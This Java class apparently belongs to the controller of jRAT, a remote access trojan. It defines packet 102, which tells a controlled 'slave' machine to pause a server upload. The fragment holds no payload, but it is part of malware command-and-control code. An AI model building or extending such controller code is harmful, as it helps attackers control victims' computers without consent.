package se.jrat.controller.packets.outgoing;

import java.io.DataOutputStream;

import se.jrat.controller.Slave;

public class Packet102PauseServerUpload extends AbstractOutgoingPacket {
	
	private String remote;
	
	public Packet102PauseServerUpload(String remote) {
		this.remote = remote;
	}
	
	@Override
	public void write(Slave slave, DataOutputStream dos) throws Exception {
		slave.writeLine(remote);
	}

	@Override
	public short getPacketId() {
		return 102;
	}

}
